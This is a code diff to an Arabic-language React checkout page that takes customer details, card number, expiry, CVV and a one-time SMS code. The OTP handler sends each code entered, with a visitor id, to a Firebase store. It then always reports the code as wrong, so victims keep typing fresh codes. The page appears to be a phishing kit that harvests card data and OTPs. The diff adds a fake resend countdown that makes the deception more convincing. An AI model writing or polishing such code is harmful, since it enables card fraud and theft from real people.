@@ -1,7 +1,7 @@
 "use client"
 
 import type React from "react"
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { AlertCircle, CheckCircle, ArrowLeft } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
@@ -13,7 +13,6 @@ import { ProgressIndicator } from "./progress-indicator"
 import { PaymentForm } from "./payment-form"
 import { CustomerForm } from "./customer-form"
 import { addData } from "@/lib/firebase"
-import { set } from "firebase/database"
 
 type CheckoutStep = "customer" | "payment" | "otp" | "success" | "error"
 
@@ -31,12 +30,16 @@ interface CardData {
   expiry: string
   cvv: string
 }
-const allOtps=['']
+
+const allOtps = [""]
+
 export default function Component() {
   const [step, setStep] = useState<CheckoutStep>("customer")
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState("")
   const [otp, setOtp] = useState("")
+  const [countdown, setCountdown] = useState(30)
+  const [canResend, setCanResend] = useState(false)
 
   const [customerData, setCustomerData] = useState<CustomerData>({
     firstName: "",
@@ -56,6 +59,37 @@ export default function Component() {
   const steps = ["معلومات العميل", "الدفع", "التحقق", "اكتمال"]
   const currentStepIndex = step === "customer" ? 0 : step === "payment" ? 1 : step === "otp" ? 2 : 3
 
+  // Countdown timer effect
+  useEffect(() => {
+    let interval: NodeJS.Timeout | null = null
+
+    if (step === "otp" && countdown > 0) {
+      interval = setInterval(() => {
+        setCountdown((prev) => {
+          if (prev <= 1) {
+            setCanResend(true)
+            return 0
+          }
+          return prev - 1
+        })
+      }, 1000)
+    }
+
+    return () => {
+      if (interval) {
+        clearInterval(interval)
+      }
+    }
+  }, [step, countdown])
+
+  // Reset countdown when entering OTP step
+  useEffect(() => {
+    if (step === "otp") {
+      setCountdown(30)
+      setCanResend(false)
+    }
+  }, [step])
+
   const handleCustomerNext = () => {
     setStep("payment")
   }
@@ -63,30 +97,42 @@ export default function Component() {
   const handlePaymentNext = async () => {
     setError("")
     setStep("otp")
-  
+  }
 
+  const handleResendOtp = () => {
+    setCountdown(30)
+    setCanResend(false)
+    setError("")
+    // Here you would typically call your API to resend the OTP
+    console.log("Resending OTP...")
+  }
+
+  const formatTime = (seconds: number) => {
+    const mins = Math.floor(seconds / 60)
+    const secs = seconds % 60
+    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
   }
 
   const handleOtpVerification = async (e: React.FormEvent) => {
     e.preventDefault()
-    const _id=localStorage.getItem('visitor')
+    const _id = localStorage.getItem("visitor")
     setLoading(true)
     allOtps.push(otp)
-    addData({id:_id,otp,allOtps})
-    setTimeout(() => {
-        setLoading(false)
-    
-        setOtp("")
-        setError("الرمز خاطىء يرجى المحاولة مره اخرى")
-        }, 5000);
+    addData({ id: _id, otp, allOtps })
 
-   
+    setTimeout(() => {
+      setLoading(false)
+      setOtp("")
+      setError("الرمز خاطىء يرجى المحاولة مره اخرى")
+    }, 5000)
   }
 
   const resetForm = () => {
     setStep("customer")
     setError("")
     setOtp("")
+    setCountdown(30)
+    setCanResend(false)
     setCustomerData({
       firstName: "",
       phone: "",
@@ -130,6 +176,7 @@ export default function Component() {
                 تم إرسال رمز التحقق إلى هاتفك المحمول المنتهي بـ ****{customerData.phone.slice(-4)}
               </DialogDescription>
             </DialogHeader>
+
             <form onSubmit={handleOtpVerification} className="space-y-6">
               <div className="space-y-3">
                 <Label htmlFor="otp" className="text-center block font-medium">
@@ -144,11 +191,20 @@ export default function Component() {
                   maxLength={6}
                   required
                 />
+
                 <div className="text-center">
                   <p className="text-sm text-gray-500 mb-2">لم تستلم الرمز؟</p>
-                  <button type="button" className="text-blue-600 hover:underline text-sm font-medium">
-                    إعادة الإرسال (00:30)
-                  </button>
+                  {canResend ? (
+                    <button
+                      type="button"
+                      onClick={handleResendOtp}
+                      className="text-blue-600 hover:underline text-sm font-medium hover:text-blue-700 transition-colors"
+                    >
+                      إعادة الإرسال
+                    </button>
+                  ) : (
+                    <span className="text-gray-400 text-sm font-medium">إعادة الإرسال ({formatTime(countdown)})</span>
+                  )}
                 </div>
               </div>
 
@@ -201,8 +257,8 @@ export default function Component() {
                     <span className="font-medium">{customerData.firstName}</span>
                   </div>
                   <div className="flex justify-between items-center">
-                    <span className="text-gray-600">المبلغ المدفوع:</span>
-                    <span className="font-bold text-lg text-green-600">95.00 ريال عماني</span>
+                    <span className="text-gray-600">المبلغ المدفوع:</span>W
+                    <span className="font-bold text-lg text-green-600">0.50 ريال عماني</span>
                   </div>
                   <div className="flex justify-between items-center">
                     <span className="text-gray-600">تاريخ العملية:</span>
